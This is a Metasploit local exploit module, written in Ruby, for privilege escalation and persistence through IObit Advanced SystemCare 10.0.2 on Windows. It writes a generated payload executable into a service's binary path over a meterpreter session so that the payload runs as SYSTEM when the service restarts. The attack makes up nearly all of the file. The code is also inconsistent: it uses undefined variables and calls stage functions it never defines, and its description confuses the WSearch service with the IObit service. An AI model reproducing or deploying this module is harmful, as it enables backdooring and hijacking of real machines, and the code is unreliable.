# ----------------------------
# Module Dependencies/requires
# ----------------------------
require 'rex'
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'



# ----------------------------------
# Metasploit Class name and includes
# ----------------------------------
class MetasploitModule < Msf::Exploit::Local
  Rank = GreatRanking

         include Msf::Exploit::EXE
         include Msf::Exploit::FileDropper
         include Msf::Post::File
         include Msf::Post::Common
         include Msf::Post::Windows::Priv
         include Msf::Post::Windows::Services



# -----------------------------------------
# Building Metasploit/Armitage info GUI/CLI
# -----------------------------------------
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'persistence/privilege_escalation in IObit Advanced SystemCare 10.0.2',
                        'Description'   => %q{
                                        This post-exploitation module requires a meterpreter session to be able to upload/inject our SearchIndexer.exe into WSearch (windows search) service. The WSearch service uses one executable.exe set in binary_path_name and runs it has local/system at startup, this enables local privilege_escalation/persistence_backdooring. To exploit this vulnerability a local attacker needs to inject/replace the executable file into the binary_path_name of the service. Rebooting the system or restarting the service will run the malicious executable with elevated privileges."WARNING: payload to send must be named as: ASCService.exe"
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'Chaitanya Haritash', # post-module author/vuln discover
                                        'SpecialThanks : r00t-3xp10it', # testing/debug module
                                ],
 
                        'Version'        => '$Revision: 1.0',
                        'DisclosureDate' => 'out 27 2016',
                        'Platform'       => 'windows',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'false',
                        'Targets'        =>
                                [
                                         # 
                                         [ 'Windows XP', 'Windows VISTA', 'Windows 7', 'Windows 8', 'Windows 9', 'Windows 10' ]
                                ],
                        'DefaultTarget'  => '3', # default its to run againts windows 7 (32 bits)
                        'References'     =>
                                [
                                         [ 'URL', 'https://www.exploit-db.com/exploits/40577/' ],



                                ],
			'DefaultOptions' =>
				{
					'SESSION' => '1', # Default its to run againts session 1
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptString.new('UPLOAD_PATH', [ false, 'The full path of your SearchIndexer.exe to be uploaded']),
                                OptBool.new('SERVICE_STATUS', [ false, 'Check remote WSearch service settings?' , false])
                        ], self.class)

                register_advanced_options(
                        [
                                OptBool.new('DELETE_PERSISTENCE', [ false, 'revert WSearch service executable to default?' , false])
                        ], self.class)
 
        end



# ----------------------------------------------
# Check for proper target Platform (win32|win64)
# ----------------------------------------------
def unsupported
   session = client
     sys = session.sys.config.sysinfo
       print_warning("[ABORT]: Operative System => #{sys['OS']}")
       print_error("Only windows systems are supported by this module...")
       print_error("Please execute [info] for further information...")
       print_line("")
   raise Rex::Script::Completed
end




# -------------------------------------------
# drop malicious executable into service path
# -------------------------------------------
def ls_stage1

    #
    # variable declarations
    #
    srv_name = "AdvancedSystemCareService10"
    exe_name = "#{p_name}" # Advanced
    exe_path = "#{d_path}" # %programfiles%\\IObit
    bin_path = exe_path + '\\' + exe_name + '.exe' # C:\\Program Files\\IObit\\Advanced.exe
    print_status("Placing malicious binary..")

    #
    # Drop the malicious executable into the path
    #
    exe = generate_payload_exe_service({:servicename=> svr_name})
    print_status("Writing #{exe.length.to_s} bytes to #{bin_path}...")
    begin
      fd = session.fs.file.new(bin_path, 'wb')
      fd.write(exe)
      fd.close
    rescue Rex::Post::Meterpreter::RequestError => e
      # Can't write the file, can't go on
      fail_with(Failure::Unknown, e.message)
    end
end


# ------------------------------------------------
# MAIN DISPLAY WINDOWS (ALL MODULES - def run)
# Running sellected modules against session target
# ------------------------------------------------
def run
  session = client
    # Check for proper target Platform
    unsupported if client.platform !~ /win32|win64/i

      # Variable declarations (msf API calls)
      sysnfo = session.sys.config.sysinfo
      runtor = client.sys.config.getuid
      runsession = client.session_host
      directory = client.fs.dir.pwd


    # Print banner and scan results on screen
    print_line("    +-------------------------------------------------------+")
    print_line("    | PERSISTENCE + PRIV_ESCAL IN IObit Advanced SystemCare |")
    print_line("    |    Author: Chaitanya / @Indi_G34r                     |")
    print_line("    +-------------------------------------------------------+")
    print_line("")
    print_line("    Running on session  : #{datastore['SESSION']}")
    print_line("    Computer            : #{sysnfo['Computer']}")
    print_line("    Operative System    : #{sysnfo['OS']}")
    print_line("    Target IP addr      : #{runsession}")
    print_line("    Payload directory   : #{directory}")
    print_line("    Client UID          : #{runtor}")
    print_line("")
    print_line("")


 
# ------------------------------------
# Selected settings to run
# ------------------------------------
      if datastore['UPLOAD_PATH']
         ls_stage1
      end

      if datastore['DELETE_PERSISTENCE']
         ls_stage2
      end

      if datastore['SERVICE_STATUS']
         ls_stage3
      end
   end
end
